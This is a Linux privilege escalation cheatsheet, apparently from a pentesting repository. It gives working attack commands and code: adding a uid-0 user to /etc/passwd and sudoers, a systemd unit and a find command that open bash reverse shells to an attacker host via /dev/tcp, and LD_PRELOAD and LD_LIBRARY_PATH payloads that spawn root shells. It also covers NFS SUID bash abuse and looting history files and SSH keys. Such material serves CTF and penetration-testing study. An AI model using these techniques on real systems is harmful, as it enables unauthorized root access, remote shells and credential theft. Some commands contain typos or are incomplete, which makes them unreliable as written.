# 🐧 LInux-Privilege-Escalation

Linux Privilege Escalation Cheatsheet

## Edit /etc/passwd File
For this you need to have write permission on the /etc/passwd file

### Create Encrypted Password and Salt
```
openssl passwd -1 -salt <username> <password>
```
### Add The Password To /etc/passwd
```
sudo nano /etc/passwd

<username>:<hashed password>:0:0:,,,:/home/nikki:/bin/bash
```

### Login As The New User
```
su <username>
```


## Edit Sudoers File
For this you need to have write permission on the /etc/sudoers

```
sudo nano /etc/sudoers

Add a new user in the User privilege specification section

<username> ALL=(ALL:ALL) ALL
```

### Switch To The New User
```
su <username>

sudo -i
```


## Systemctl - SUID Binary

### Find The SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```
### Locate Service Files
```
locate .service

cat /usr/lib/systemd/system/udev.service
```
### Define Your Own Service
```
cd /tmp

nano shell.service
```
***shell.service***
```
[Unit]
Description=reverse shell

[Service]
User=root
ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/<attacker ip>/<attacker port> 0>&1'
```
### Setup The Listener
```
nc -vlp 1234
```
### Enable Shell.service File
```
/usr/bin/systemctl enable /temp/shell.service
```
### Start The Service
```
/usr/bin/systemctl start shell
```

***You Should Get the Root Shell On The Attacker Machine***


## Find Command
```
sudo -l
```

***Create a file called sample***

```
/usr/bin/find sample -exec whoami \;

sudo /usr/bin/find sample -exec bash -i \;

sudo find sample -exec bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1 \;
```


## Vim Command
```
sudo -l
```
### Non Persistence Method
```
sudo vim

:set shell=/bin/bash
:shell
```
### Persistence Method
```
sudo vim /etc/sudoers

In the User privilege specification section
<username> ALL=(ALL:ALL) ALL
```


## CRON Jobs

### View the Contents of Crontab
```
cat /etc/crontab
```

## kernal Exploits

### View the Kernal Details and Distribution Information
```
uname -a

lsb_release -a
```
### Search for Kernal Exploits
```
searchsploit linux kernal 5
```
### Linux Exploit Suggester Script

[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

```
git clone https://github.com/The-Z-Labs/linux-exploit-suggester

cd linux-exploit-suggester

./linux-exploit-suggester.sh -h
```


## LinPeas, LinSmartEnum Scripts

[LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

[LinSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration)

### Run LinPeas
```
./linpeas.sh
```

### Run LinSmartEnum
```
./lse.sh
```


## Readable SSH Key
```
ssh -i <prive_key.private> bandit14@localhost

yes
```


## LD_PRELOAD Injection

[LD_PRELOAD Injection](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

### Add the below line in /etc/sudoers
```
Defaults env_keep+=LD_PRELOAD
```
### List the Permissions
```
sudo -l
```
***Pwn.c***
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
```
//Compile and Run

gcc -fPIC -shared -o pwn.so pwn.c -nostartfiles

sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/ping
```


## LXD Privilege Escalation

[LXD Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)



## LD_LIBRARY_PATH Injection

[LD_LIBRARY_PATH](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/)


```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

sudo LD_LIBRARY_PATH=/tmp/sbin/apache2
```


## SUID SGID Binaries

[SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

### Find SUID Files
```
find / -perm -u=s -type f 2>/dev/null
```


## Looting Passwords

```
ls -la

cat .*history

cd .ssh && ls

ssh -i root_key root@<IP Addr>
```


## NFS Root Squashing

### Check for "no_root_squash"
```
cat /etc/exports
```

### Mount
```
mkdir /tmp/nfs_share

sudo su

mount -o rw,vers=2 <IP Addr>:/<path> /tmp/nfs_share/

cp /bin/bash ./cash

chmod u+s cash
```


## Python Module Injection

[Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

```
ps aux | grep root

cat /etc/crontab

ls /tmp

cd /opt && ls
```


